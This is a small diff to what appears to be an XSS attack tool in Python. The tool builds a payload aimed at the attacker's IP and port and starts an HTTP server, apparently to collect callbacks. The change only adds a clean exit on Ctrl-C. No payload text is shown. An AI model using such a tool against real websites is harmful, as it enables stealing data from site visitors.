@@ -114,4 +114,7 @@ if __name__ == "__main__":
         print("[!] The XSS payload should be;\n")
         generate_payload(f"http://{args.ip}:{args.port}")
         print(110 * '=')
-        httpd.serve_forever()
+        try:
+            httpd.serve_forever()
+        except KeyboardInterrupt:
+            print("\nExiting...")
